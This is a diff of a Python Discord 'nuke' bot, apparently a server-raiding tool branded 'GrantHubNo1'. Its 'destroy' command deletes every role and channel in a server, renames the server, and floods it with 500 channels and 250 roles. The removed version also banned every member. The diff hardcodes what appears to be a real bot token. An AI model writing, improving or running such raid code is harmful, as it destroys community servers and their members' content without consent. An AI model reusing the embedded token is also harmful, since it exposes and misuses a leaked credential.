@@ -1,3 +1,6 @@
+import discord
+from discord.ext import commands
+from discord.utils import get
 print("		                                                                      ")
 print("░██████╗░██████╗░░█████╗░███╗░░██╗████████╗  ██╗░░██╗██╗░░░██╗██████╗░")
 print("██╔════╝░██╔══██╗██╔══██╗████╗░██║╚══██╔══╝  ██║░░██║██║░░░██║██╔══██╗")
@@ -5,33 +8,39 @@ print("██║░░██╗░██████╔╝███████�
 print("██║░░╚██╗██╔══██╗██╔══██║██║╚████║░░░██║░░░  ██╔══██║██║░░░██║██╔══██╗")
 print("╚██████╔╝██║░░██║██║░░██║██║░╚███║░░░██║░░░  ██║░░██║╚██████╔╝██████╦╝")
 print("░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░  ╚═╝░░╚═╝░╚═════╝░╚═════╝░")
-token = input("Bot token:")
-serverid = input("Server Id:")
-import discord
-from discord.ext import commands
-from discord.utils import get
-client = discord.Client()
-name = "Hack By nuke.net#9296"
+texts = "GrantHubNo1"
+bot = commands.Bot(command_prefix="$sudo ", cas_insentive=True, help_command=None)
+token = 'OTg0NDM1MTAxMTU0ODA3ODg5.G82xqg.FFeAzS52UkloXaGrLTfb0641P_NZEQzLl5JGxU'
+text = texts
+name = text
 names = name
-bot = commands.Bot(command_prefix="G|", cas_insentive=True, help_command=None)
-text = "createchanel " + name + " in " + serverid
-textr = "createrole " + name + " in " + serverid
 @bot.command()
-async def nuke(ctx):
+async def destroy(ctx):
+    guild = ctx.message.guild
+    for role in ctx.guild.roles:  
+        try:  
+            await role.delete()
+            print("Delete Role")
+        except:
+            pass
     await ctx.guild.edit(name=name)
     for c in ctx.guild.channels:
-        await c.delete() 
-    guild = ctx.message.guild
-    for i in range(1, 500):
-        print(text)
-        channels = await guild.create_text_channel(name) 
-    for i in range(1, 500):
-        print(textr)
-        await guild.create_role(name=names)
-    for member in list(ctx.guild.members):
-      try:
-        await member.ban(reason=name, delete_message_days=7)
-        print(f"Banned {member.display_name}!" + "in" + serverid)
-      except Exception:
-        pass
+        try:  
+            await c.delete() 
+            print("Delete Channel")
+        except:
+            pass
+    print("Change Name")
+    for i in range(500):
+        try:
+            await guild.create_text_channel(name)
+            print("Create Channel")
+        except:
+            pass
+    for i in range(250):
+        try:
+            await guild.create_role(name=names)
+            print("Create Role")
+        except:
+            pass
 bot.run(token)
